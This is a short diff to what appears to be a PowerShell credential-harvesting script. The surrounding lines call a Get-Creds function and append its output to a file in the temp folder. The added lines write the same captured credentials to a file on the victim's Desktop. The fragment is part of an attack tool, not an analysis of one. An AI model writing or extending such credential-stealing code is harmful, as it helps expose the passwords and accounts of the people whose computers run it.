@@ -154,6 +154,11 @@ $creds = Get-Creds
 
 echo $creds >> $env:TMP\$FileName
 
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
+$TargetFilePath = Join-Path -Path $desktopPath -ChildPath $FileName
+echo $creds >> $TargetFilePath
+
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
